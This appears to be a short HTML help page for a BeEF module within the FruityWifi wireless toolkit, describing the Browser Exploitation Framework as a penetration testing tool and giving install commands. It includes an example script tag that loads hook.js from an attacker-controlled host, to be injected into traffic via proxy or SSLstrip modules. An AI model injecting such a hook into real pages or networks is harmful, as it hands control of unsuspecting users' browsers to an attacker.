Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
<br>
Browser Exploitation Framework (BeEF) - http://beefproject.com
<br><br>
<b>BeEF</b> is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser.
<br><br>
Amid growing concerns about web-borne attacks against clients, including mobile clients, BeEF allows the professional penetration tester to assess the actual security posture of a target environment by using client-side attack vectors. Unlike other security frameworks, BeEF looks past the hardened network perimeter and client system, and examines exploitability within the context of the one open door: the web browser. BeEF will hook one or more web browsers and use them as beachheads for launching directed command modules and further attacks against the system from within the browser context.
<br>
<br>
<b>Note</b>: use FruityProxy, Captive, or SSLstrip (inject) modules to inject <b>hook.js</b>:
<br><br>
<font face="monospace">http://{FruityWifi-IP}:3000/hook.js</font>
<br><br>
<b>Example</b>: <font face="monospace">&lt;script src=&quot;http://10.0.0.1:3000/hook.js&quot;&gt;&lt;/script&gt;</font>
<br>
<br>
<b>BeEF Install</b>:
<font face="monospace">
<br>cd /usr/share/fruitywifi/www/modules/beef/includes
<br>chmod 755 install.sh
<br>./install.sh
</font>

<br>

